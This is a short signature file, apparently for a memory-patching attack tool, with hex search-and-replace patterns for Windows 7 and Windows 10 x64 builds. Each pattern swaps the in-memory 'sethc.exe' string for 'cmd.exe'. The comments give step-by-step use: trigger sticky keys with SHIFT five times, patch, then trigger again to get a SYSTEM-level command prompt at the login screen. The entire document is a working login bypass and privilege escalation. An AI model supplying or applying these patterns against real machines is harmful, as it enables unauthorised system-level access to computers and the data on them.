# replace sethc.exe with cmd.exe on Windows
# syntax: see signature_info.txt for more information.
#
# Signature by Ian Vitek
#
# Signature more likely to work after activating sticky keys at least once.
# (Not 100% reliable to find the signature in memory, but fiddeling around
#  with sticky keys will in the end leave the sethc.exe in memory.)
# So, press SHIFT five times to start sethc.exe then patch with this signature.
# Close the Sticky Key dialog and press SHIFT five times
#  to get cmd.exe with system access at login.
#
# Windows 7 x64 20160901
BBF,00730065007400680063002E00650078006500200025006C006400000000000000730065007400680063002E006500780065,0,-,BBF,0063006D0064002E0065007800650020002000200025006C00640000000000000063006D0064002E00650078006500200020
# Windows 10 x64 20150710
F7F,00730065007400680063002E00650078006500200025006C006400000000000000730065007400680063002E006500780065,0,-,F7F,0063006D0064002E0065007800650020002000200025006C00640000000000000063006D0064002E00650078006500200020
# Windows 10 x64 Anniversary
26F,00730065007400680063002E00650078006500200025006C006400000000000000730065007400680063002E006500780065,0,-,26F,0063006D0064002E0065007800650020002000200025006C00640000000000000063006D0064002E00650078006500200020
